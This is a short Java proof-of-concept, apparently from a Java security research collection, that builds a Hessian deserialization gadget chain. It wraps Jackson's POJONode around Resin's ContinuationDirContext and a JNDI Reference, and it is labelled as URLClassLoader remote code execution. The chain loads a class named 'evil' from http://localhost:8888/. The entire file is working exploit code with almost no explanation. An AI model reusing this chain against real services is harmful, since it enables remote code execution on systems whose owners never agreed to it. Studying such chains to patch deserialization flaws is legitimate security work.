package com.javasec.pocs.hessian;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

/**
 * 基本同EL
 */
public class HessianJackResinChain {
    public static void main(String[] args) throws Exception {
        //URLCLASSLOADER RCE
        Reference refObj=new Reference("evil","evil","http://localhost:8888/");
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(refObj);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        POJONode jsonNodes = new POJONode(ctx);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(jsonNodes));
    }
}
